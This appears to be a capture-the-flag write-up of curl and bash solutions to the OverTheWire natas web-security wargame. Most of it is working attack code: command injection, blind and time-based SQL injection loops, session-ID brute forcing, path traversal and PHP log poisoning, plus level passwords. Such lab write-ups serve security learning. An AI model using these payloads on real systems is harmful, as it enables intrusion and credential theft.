# natas

This is a serverside web-security wargame, you can play at http://overthewire.org/wargames/natas/

I have seen some natas writeups, but all of them use python to solve challenges. During play this game, I wrote some shellcode instead of python to solve many higher level. And here, I will show you the power of shellcode, the magic of `curl` command. Hope you like it.

**Note**: I added some lower-level, but there are many levels I didn't write, I need more free time.

## natas0

```sh
curl --silent --user natas0:natas0 http://natas0.natas.labs.overthewire.org | grep "password for natas1"
```

## natas1

```sh
curl --silent --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org | grep "password for natas2"
```

## natas2

```sh
curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org
```

View source and we see there is a image named *pixel.png* in folder */files/*, something exists on it?

```sh
curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/
```

There are 2 files in here, one is *users.txt*

```sh
curl --silent --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/files/users.txt | grep natas3
```

## natas3

```sh
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org
```

```
No more information leaks!! Not even Google will find it this time...
```

Something related to Google? Find out *robots.txt*

```sh
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/robots.txt
```

A folder disallow to access? Try access it, */s3cr3t/*

```sh
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/
```

and we find out *users.txt*

```sh
curl --silent --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

## natas4

```sh
curl --silent --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org
```

```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```

We need referer in request

```sh
curl --silent --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ --referer "http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org | grep "password for natas5"
```

## natas5

```sh
curl --silent --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org
```

```
Access disallowed. You are not logged in
```

Huhm huhm huhm, not logged in? Something in cookie, GET or POST request will tell server logged in or not?

And we need browser to see how we communicate with the server? Use Live HTTP headers and we can see a first request have `Set-Cookie: loggedin=0`, let take a flag

```sh
curl --silent --user natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq --cookie loggedin=1 http://natas5.natas.labs.overthewire.org | grep "password for natas6"
```

## natas6

A secret value is in a */includes/secret.inc*

```sh
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 http://natas6.natas.labs.overthewire.org/includes/secret.inc
```

Send it to the server and get the password

```sh
curl --silent --user natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 --data "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query" http://natas6.natas.labs.overthewire.org | grep "password for natas7"
```

## natas7

```sh
curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org
```

There are 2 url in here, and its format is *index.php?page=/path/to/file*. With one more hint: `password for webuser natas8 is in /etc/natas_webpass/natas8`. It is Directory Traversal vulnerability (in a basic)

```sh
curl --silent --user natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

## natas8

```sh
curl --silent --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe http://natas8.natas.labs.overthewire.org
```

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
```

```
bin2hex(strrev(base64_encode($_POST['secret']))) = "3d3d516343746d4d6d6c315669563362"
$_POST['secret'] = base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))
$_POST['secret'] = "oubWYf2kBq"
```

```sh
curl --silent --user natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe --data "secret=oubWYf2kBq&submit=Submit" http://natas8.natas.labs.overthewire.org | grep "password for natas9"
```

## natas9

```sh
curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org
```

View source

```sh
curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl http://natas9.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html
```

Keyword is sent through $_REQUEST['needle'], if keywork is not NULL, function `passthru` will exec cmd ```grep -i $key dictionary.txt```. Text to cmd, we can do very much with it, try injection ```;``` and you have 2 cmd, it means that you can control every command you want

```sh
_url_natas9="$(echo 'http://natas9.natas.labs.overthewire.org/index.php?needle=tmp; cat /etc/natas_webpass/natas10 #' | \
	sed 's/ /%20/g' | \
	sed 's/#/%23/g')"
curl --silent --user natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl $_url_natas9
```

## natas16

```sh
_password=""
for _i in {1..32}; do
  for _j in {48..122}; do
    echo -e "Try $_j at position $_i"
    _url="$(curl -s --user natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data "username=natas16\" AND ASCII(SUBSTRING((SELECT password FROM users where username=\"natas16\" limit 0,1),$_i,1)) = \"$_j\"-- +" natas15.natas.labs.overthewire.org/index.php)"
    filter=$(echo $_url | grep "er exists")
    if [[ -n $filter ]]; then
      _password="$_password$(printf "\x$(printf %x $_j)")"
      echo -e $_password
      break
    fi
  done
done
```

## natas17

```sh
_password=""
for _i in {1..32}; do
  for _j in {A..z} {9..0}; do
    echo -e "Try char $_j at position $_i"
    _url="$(curl -s --user natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 'http://natas16.natas.labs.overthewire.org/?needle=%24(egrep+^'${_password}${_j}'.*+%2Fetc%2Fnatas_webpass%2Fnatas17)sonatas&submit=Search')"
    filter=$(echo $_url | grep "sonatas")
    if [[ -z $filter ]]; then
        _password="$_password$_j"
        echo -e $_password
        break
    fi
  done
done
```

## natas18

```sh
_password=""
for _i in {1..32}; do
  for _j in {A..z} {9..0}; do
    _time=$(date +%s)
    _url=$(curl \
      --silent \
      --header "Content-Type: application/x-www-form-urlencoded" \
      --user "natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" \
      --data "username=natas18\" and hex(substring(password,$_i,1)) = hex(\"$_j\") and sleep(10+1)-- -" \
      --location "http://natas17.natas.labs.overthewire.org/index.php")
    _time=$(($(date +%s)-_time))
    
    echo -e "Try char $_j at position $_i in $_time second(s)"
    if [[ $_time -gt 10 ]]; then
        _password="$_password$_j"
        echo -e "Password: " $_password
        break
    fi
  done
done
```

## natas19

```sh
for _i in {1..640}; do
  echo -e "Tring PHPSESSID=$_i"
  url="$(curl \
    --silent \
    --user "natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP" \
    --data "username=admin&password=NULL" \
    --cookie "PHPSESSID=$_i" \
    --location "http://natas18.natas.labs.overthewire.org/index.php")"
  filter=$(echo $url | grep "Password:")

  if [[ -n $filter ]]; then
    echo $url | grep --color "Password:"
      break
  fi
done
```

## natas20

```sh
for _i in {1..640}; do
  echo -e "Tring PHPSESSID=$_i"
  _url="$(curl \
    --silent \
    --user "natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" \
    --data "username=admin&password=NULL" \
    --cookie "PHPSESSID=$(echo -n "$_i-admin" | xxd -p)" \
    --location "http://natas19.natas.labs.overthewire.org/index.php")"
  filter=$(echo $_url | grep "Password:")

  if [[ -n $filter ]]; then
    echo $_url | grep --color "Password:"
      break
  fi
done
```

## natas21

```sh
curl -u natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF --data "name=root%0Aadmin 1" http://natas20.natas.labs.overthewire.org/index.php?debug --cookie "PHPSESSID=njlkb373h5k9q92hdf57ggtl01" | grep --color Password
```

## natas23

```sh
curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ http://natas22.natas.labs.overthewire.org/index.php?revelio | grep --color Password
```

## natas24

```sh
curl -u natas23:D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou | grep --color Password
```

## natas26

```sh
curl \
  --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c \
  --cookie PHPSESSID=blahblahblah \
  --user-agent "<?php echo file_get_contents('/etc/natas_webpass/natas26') ?>" \
  --location http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//tmp/natas25_blahblahblah.log
```
